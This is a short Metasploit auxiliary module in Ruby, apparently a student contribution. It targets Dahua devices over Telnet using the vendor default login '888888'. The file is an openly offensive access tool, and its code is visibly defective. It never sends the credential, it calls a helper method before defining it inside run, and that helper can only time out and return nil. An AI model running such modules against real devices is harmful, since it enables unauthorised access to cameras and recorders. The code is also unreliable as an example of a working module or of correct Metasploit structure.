##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::Telnet

    def initialize
      super(
          'Name'            => %q(Dahua Telnet Login),
          'Description'     => %q(Utilizing the '888888' login to obtain Telnet session.),
          'Author'          => [
              'Terry Antram - 3antrt67[at]solent.ac.uk'
          ],
          'License'         => MSF_LICENSE
      )

      deregister_options('RHOST')
      register_options(
          [
              Opt::RPORT(23),
          ])
    end

    def run
        print_status("#{rhost}:#{rport} - Attempting Telnet connection...")
        ctx = { 'Msf' => framework, 'MsfExploit' => self }
        sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => rport, 'Context' => ctx, 'Timeout' => 10 })

        if sock.nil?
            fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Service unreachable")
        end

        add_socket(sock)

        print_status("#{rhost}:#{rport} - Establishing Telnet session...")
        prompt = negotiate_telnet(sock)

        if prompt.nil?
            sock.close
            fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to establish Telnet connection...")
        else
            print_good("#{rhost}:#{rport} - Telnet session established")
        end

        def negotiate_telnet(sock)
            begin
                Timeout.timeout(25) do
                    while(true)
                        data = sock.get_once(-1, 10)
                    end
                end
            end
        rescue ::Timeout::Error
            return nil
        end
    end
end
